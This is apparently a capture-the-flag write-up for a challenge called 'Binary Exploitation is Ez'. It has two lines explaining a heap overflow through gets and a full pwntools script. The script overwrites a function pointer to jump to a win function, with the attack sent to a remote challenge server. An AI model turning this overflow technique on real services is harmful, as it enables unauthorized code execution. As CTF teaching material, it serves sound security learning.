# Binary Exploitation is Ez

- Heap overflow because of call to gets.
- Overwrite function pointer and call winwin.

#### Exploit
```python
#!/usr/bin/python3
from pwn import *

####Utils
def newmeme(size,data):
	io.sendlineafter("Choice: ","1")
	io.sendlineafter("size: ",str(size))
	io.sendafter("content: ",data)

def editmeme(idx,data):
	io.sendlineafter("Choice: ","2")
	io.sendlineafter("Index: ",str(idx))
	io.sendafter("content: ",data)

def printmeme(idx):
	io.sendlineafter("Choice: ","3")
	io.sendlineafter("Index: ",str(idx))

####Addr
win = 0x4014a0

####Exploit
#io = process(["./ez"])
io = remote("128.199.157.172",23170)
newmeme(0x18,"HK\n") #0
newmeme(0x18,"HK\n") #1
editmeme(0,b"A"*0x18+p64(0x21)+p64(win)+b"\n")
printmeme(1)
io.interactive()
```
